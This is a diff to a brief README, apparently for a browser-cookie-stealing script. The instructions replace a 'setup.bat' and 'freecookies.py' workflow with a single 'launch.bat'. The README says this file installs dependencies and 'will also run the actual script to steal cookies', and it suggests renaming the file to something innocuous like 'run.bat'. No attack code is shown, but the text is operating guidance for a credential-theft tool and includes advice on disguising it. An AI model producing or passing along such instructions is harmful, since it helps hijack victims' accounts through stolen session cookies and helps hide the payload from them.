@@ -1,5 +1,5 @@
 1. install this: https://www.python.org/ftp/python/3.9.1/python-3.9.1-amd64.exe
-2. after installing python, run "setup.bat", to install all dependencies.
-3. once "setup.bat" is done downloading, run the freecookies.py file! have fun.
+2. Once you're done downloading the python install, run "launch.bat". It will install any updates, and dependencies if needed.
+   ("launch.bat" will also run the actual script to steal cookies, so be careful)
 
-(you may rename these files to whatever you want)
+(you may delete this file, and rename "launch.bat" to anything. (e.g "run.bat"))
